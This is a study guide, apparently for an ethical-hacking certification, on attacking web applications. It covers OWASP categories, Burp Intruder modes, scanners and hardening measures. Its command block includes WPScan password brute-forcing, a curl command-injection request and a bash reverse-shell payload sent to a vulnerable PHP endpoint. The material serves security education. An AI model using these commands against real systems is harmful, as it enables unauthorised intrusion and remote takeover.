# Module 14: Hacking Web Applications

## Tier 1: Core Concepts & Principles

### Web Application Architecture & Threat Model
* **Web Application Architecture:** A multi-tiered software ecosystem consisting of the Client Browser (Presentation Tier), Web Server (HTTP Processing Tier), Application Server/Logic Engine (Business Logic Tier), and Database Server (Data Storage Tier).
* **OWASP Top 10 Focus Vectors:**
  * **Broken Access Control (A01):** Failure to enforce authorization checks, leading to Insecure Direct Object References (IDOR), privilege escalation, or unauthorized data access.
  * **Cryptographic Failures (A02):** Insecure data transmission (HTTP cleartext), weak hash algorithms (MD5, SHA-1), or missing transport layer security.
  * **Injection (A03):** Untrusted user inputs evaluated as interpreter code (SQLi, Command Injection, LDAP Injection, XSS).
  * **Insecure Design (A04):** Flaws in business logic architecture that cannot be fixed by implementation controls alone.
  * **Security Misconfiguration (A05):** Default accounts/passwords, unhandled detailed error traces, unpatched framework plugins, or open cloud buckets.
* **Web Reconnaissance Methodology:** The systematic 4-step workflow:
  $$\text{Infrastructure Footprinting} \rightarrow \text{Web Spidering/Mapping} \rightarrow \text{Automated/Manual Vulnerability Discovery} \rightarrow \text{Controlled Validation/Exploitation}$$

---

## Tier 2: Technical Analysis & Mechanics

### Web Reconnaissance, Crawling & Authentication Mechanics
* **Web Spidering & Crawling:** Automated crawling of client-side DOM elements, hyperlinked parameters, `<form>` inputs, and API endpoints to build a complete application site tree.
* **Intercepting Proxies (Burp Suite / OWASP ZAP):** Sits inline between the browser client and destination application server to capture, inspect, modify, and replay HTTP/HTTPS request and response loops in real time.
* **Burp Intruder Attack Modes:**
  * **Sniper:** Iterates a single wordlist through a single payload marker location sequentially.
  * **Battering Ram:** Iterates a single wordlist through *all* payload marker locations simultaneously using the same payload.
  * **Pitchfork:** Iterates multiple wordlists in parallel through multiple payload marker locations simultaneously (List 1 Position 1 + List 2 Position 1).
  * **Cluster Bomb:** Iterates multiple wordlists through multiple payload marker locations using all possible permutation combinations (List 1 Item 1 $\times$ List 2 All Items).
* **Remote Code Execution (RCE) via Unpatched CMS Plugins:** Outdated Content Management System (CMS) plugins (e.g., WordPress plugins) containing unauthenticated file upload, command injection, or unsafe deserialization flaws allow attackers to execute OS commands (`curl`, `bash`, `powershell`) to gain an interactive web shell or reverse TCP shell.

### Automated Vulnerability Scanner Architecture
* **Black-Box Web Scanners (SmartScanner, Wapiti, OWASP ZAP):**
  1. *Crawling Engine:* Discovers attack surfaces (forms, query strings, headers).
  2. *Fuzzing Engine:* Injects standard attack payloads (SQLi, XSS, Path Traversal) into discovered parameters.
  3. *Analysis Engine:* Evaluates HTTP response codes, response times, and DOM text signatures for vulnerability indicators.
  * **Operational Caveat:** High susceptibility to False Positives and False Negatives; manual validation via proxy replay is mandatory.

---

## Tier 3: CLI, Tools & Framework Syntax

### Core Web Application Assessment Tooling
* **Burp Suite:** Premier intercepting proxy, web application vulnerability scanner, and parameter manipulation suite.
* **OWASP ZAP (Zed Attack Proxy):** Open-source intercepting proxy and automated web application scanner.
* **WPScan:** Specialized WordPress vulnerability scanner used to enumerate themes, plugins, timethumbs, and usernames, and perform password brute-forcing.
* **Wapiti:** Black-box CLI web vulnerability scanner that audits web applications via GET/POST parameter fuzzing.
* **cURL (`curl`):** Command-line utility for crafting custom HTTP requests and transmitting exploit strings.
* **ShellGPT (`sgpt`):** AI-powered CLI interface that converts natural language prompts into executable shell syntax.

### Key Commands & Execution Syntax

```bash
# Telnet Manual Banner Grabbing (HTTP Port 80)
telnet <Target_IP> 80
# Type manually:
GET / HTTP/1.1
Host: <Target_IP>

# WPScan Enumeration: Enumerate vulnerable plugins, themes, and users
wpscan --url http://<Target_IP>/wordpress --enumerate vp,vt,u --api-token <YOUR_WPSCAN_API_TOKEN>

# WPScan Password Brute-Forcing Syntax
wpscan --url http://<Target_IP>/wordpress --passwords /usr/share/wordlists/rockyou.txt --usernames admin

# Wapiti Web Vulnerability Scanning Syntax
# Scan target web application and generate HTML report
wapiti -u http://<Target_IP>/ -f html -o /tmp/wapiti_report.html

# cURL: Exploit RCE Endpoint / Inject Malicious Command
curl -X POST "http://<Target_IP>/wp-content/plugins/vulnerable-plugin/exploit.php" -d "cmd=id"

# cURL: Establish Reverse TCP Shell via RCE Payload
curl -X POST "http://<Target_IP>/vulnerable.php" -d "cmd=bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'"

# ShellGPT (`sgpt`) AI-Assisted Operations Syntax
# Generate custom WPScan command via natural language
sgpt "Give me a wpscan command to enumerate all users and plugins on http://<Target_IP>"

# Execute shell mode for automated web assessment execution
sgpt --shell "Run wapiti scan against http://<Target_IP> and output HTML report"
```

---

## Tier 4: Real-World Scenarios & Countermeasures

### Web Application Hardening & Defensive Controls
* **Authentication & Rate Limiting Controls:**
  * Enforce strict account lockout policies (e.g., lock account after $3\text{-}5$ failed attempts) and rate-limiting (e.g., HTTP 429 Too Many Requests) to defeat Burp Intruder / WPScan brute-force attacks.
  * Implement Multi-Factor Authentication (MFA) and CAPTCHA mechanisms on all login forms.
* **CMS & Plugin Security Management:**
  * Maintain an aggressive patch management policy; automatically update CMS core, active themes, and plugins.
  * Remove unused plugins/themes and enforce principle of least privilege for web server daemon file permissions (`chmod 755` for directories, `chmod 644` for files).
* **Input Validation & Sanitization:**
  * Implement strict context-aware input validation (whitelisting) and output encoding to eliminate command injection, SQLi, and XSS risks.
  * Disable hazardous PHP/language execution functions in configuration files (e.g., `disable_functions = exec, passthru, shell_exec, system` in `php.ini`).
* **Defensive Perimeter & Monitoring:**
  * Deploy a Web Application Firewall (WAF) configured with OWASP Core Rule Set (CRS) to detect and block automated scanners (Wapiti, WPScan) and parameter fuzzing.
  * Enable centralized logging (Event ID 4625 for failed logins, WAF request logs) and integrate with a SIEM for real-time alert triggers.

---

## Tier 5: Exam Key Hooks & Rapid Triggers

| Concept / Mechanism | High-Yield Exam Trigger | Critical Distinction |
| :--- | :--- | :--- |
| **Burp Intruder: Sniper** | 1 wordlist $\rightarrow$ 1 payload position | Tests single fields sequentially (e.g., password field only) |
| **Burp Intruder: Battering Ram** | 1 wordlist $\rightarrow$ ALL payload positions | Uses the exact same payload string across all marked parameters simultaneously |
| **Burp Intruder: Pitchfork** | Multiple wordlists $\rightarrow$ Multiple positions (Parallel) | Pairs List 1 Item $N$ directly with List 2 Item $N$ |
| **Burp Intruder: Cluster Bomb** | Multiple wordlists $\rightarrow$ Multiple positions (Permutations) | Tests every possible combination of Username $\times$ Password lists |
| **WPScan `--enumerate vp`** | Identifies vulnerable plugins installed on WordPress | Focuses scan specifically on plugins with known publicly disclosed CVEs |
| **WPScan `--enumerate u`** | Discovers valid WordPress usernames | Extracts user logins via author archive enumeration (`?author=1`) |
| **Web Spidering** | Automated recursive crawling of hyperlinks and forms | Maps the full application site tree structure prior to vulnerability scanning |
| **Wapiti** | Black-box CLI web vulnerability scanner | Performs GET/POST parameter fuzzing to detect injection and file inclusion flaws |
| **RCE via Web App** | Arbitrary OS command execution via vulnerable script/plugin | Grants attacker underlying OS command prompt (e.g., `id`, `whoami`, reverse shell) |
| **False Positive** | Scanner flags a vulnerability that does not exist | Primary reason automated vulnerability scan reports require manual verification |
```